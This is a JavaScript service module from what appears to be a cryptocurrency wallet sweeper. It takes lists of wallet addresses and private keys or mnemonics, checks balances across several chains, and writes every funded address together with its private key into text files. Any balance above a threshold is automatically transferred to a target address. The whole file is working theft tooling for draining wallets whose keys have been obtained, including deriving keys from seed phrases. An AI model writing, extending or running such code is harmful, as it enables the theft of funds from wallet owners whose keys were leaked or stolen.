const fs = require('fs/promises');
const path = require('path');
const HdKeyring = require('@metamask/eth-hd-keyring');
const { BALANCE_CHECKER_ABI } = require('../config/abi');
const { TOKEN_ADDRESSES, CHAIN_CONFIG, SCAN_DEFAULTS } = require('../config/constants');
const { getWeb3 } = require('../utils/web3Pool');
const SendCoinManager = require('./sendCoin.service');
const logger = require('../utils/logger');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const OUTPUT_DIR = process.cwd();

// --- File helpers ---

function appendFile(filename, content) {
  return fs.appendFile(path.join(OUTPUT_DIR, filename), content);
}

function formatCoinLine(explorerUrl, address, privateKey, amount, token) {
  return `${explorerUrl}/address/${address} : ${privateKey} : ${amount} ${token}\n`;
}

// --- Private key export for mnemonic wallets ---

async function ensurePrivateKey(wallet) {
  if (!wallet.privateKey && wallet.mnemonic) {
    const keyring = new HdKeyring({ mnemonic: wallet.mnemonic, numberOfAccounts: 5 });
    wallet.privateKey = await keyring.exportAccount(wallet.address);
  }
}

// --- Sweep logic ---

async function trySweep(web3, wallet, targetAddress, value, gasPrice, gasLimit, coinLine) {
  const fee = BigInt(gasPrice) * BigInt(gasLimit);
  if (BigInt(value) <= fee) return;

  try {
    const manager = new SendCoinManager(web3);
    const txHash = await manager.sendWithGas(wallet.privateKey, targetAddress, gasPrice, gasLimit);
    if (txHash) {
      wallet.balances[wallet.balances.length - 1].txHash = txHash;
      logger.info({ address: wallet.address, txHash }, 'Funds swept');
    }
  } catch (err) {
    logger.error({ address: wallet.address, err }, 'Sweep error');
  }

  await appendFile('VIP.txt', coinLine);
  await sleep(1000);
}

// --- Balance checking ---

async function checkTokenBalances({ web3, contract, wallets, token, tokenAddress, chainName, chainConfig, targetAddress }) {
  const gasLimit = chainConfig.gasLimit || 21000n;
  let gasPrice = null;
  let addressList = wallets.map((w) => w.address);

  while (addressList.length > 0) {
    const batch = addressList.splice(0, chainConfig.batchSize);

    try {
      const data = await contract.methods.balances(batch, tokenAddress).call();
      let coinText = '';
      let addressText = '';

      for (const [i, value] of data.entries()) {
        const address = batch[i];
        const wallet = wallets.find((w) => w.address === address);
        if (!wallet) continue;

        const amount = web3.utils.fromWei(value, 'ether');
        wallet.balances.push({ chain: chainName, token, balance: amount });

        // Skip zero balances
        if (value === '0' || value === 0n) continue;

        await ensurePrivateKey(wallet);

        const coinLine = formatCoinLine(chainConfig.explorerUrl, address, wallet.privateKey, amount, token);
        coinText += coinLine;
        addressText += `${address}:${wallet.privateKey}\n`;

        // Sweep if above threshold
        if (targetAddress && parseFloat(amount) > SCAN_DEFAULTS.balanceThreshold) {
          if (!gasPrice) {
            gasPrice = chainConfig.fixedGasPrice || await web3.eth.getGasPrice();
            logger.info({ chainName, gasPrice: gasPrice.toString(), gasLimit: gasLimit.toString() }, 'Gas info');
          }
          await trySweep(web3, wallet, targetAddress, value, gasPrice, gasLimit, coinLine);
        }
      }

      if (coinText) await appendFile('COIN.txt', coinText);
      if (addressText) await appendFile('address-coin.txt', addressText);
    } catch (error) {
      logger.error({ chainName, token, err: error }, 'Error checking balances batch');
    }

    await sleep(500);
  }
}

// --- Main entry ---

async function run(apiKey, addresses, tokens, chains, targetAddress) {
  for (const chainName of chains) {
    const chainConfig = CHAIN_CONFIG[chainName];
    if (!chainConfig) {
      logger.warn({ chainName }, 'Unknown chain, skipping');
      continue;
    }

    try {
      const web3 = getWeb3(chainConfig.key, apiKey);
      const tokenAddresses = TOKEN_ADDRESSES[chainConfig.key];
      const contractAddress = chainConfig.balanceCheckerAddress;
      const contract = new web3.eth.Contract(BALANCE_CHECKER_ABI, contractAddress, {
        from: contractAddress
      });

      for (const token of tokens) {
        const addr = tokenAddresses[token];
        const tokenAddress = [
          (!addr || token === 'NATIVE')
            ? '0x0000000000000000000000000000000000000000'
            : addr
        ];

        await checkTokenBalances({
          web3, contract, wallets: addresses,
          token, tokenAddress, chainName, chainConfig, targetAddress
        });
      }

      logger.info({ chainName }, 'Chain scan complete');
    } catch (error) {
      logger.error({ chainName, err: error }, 'Error processing chain');
    }
  }

  return addresses;
}

module.exports = { run };
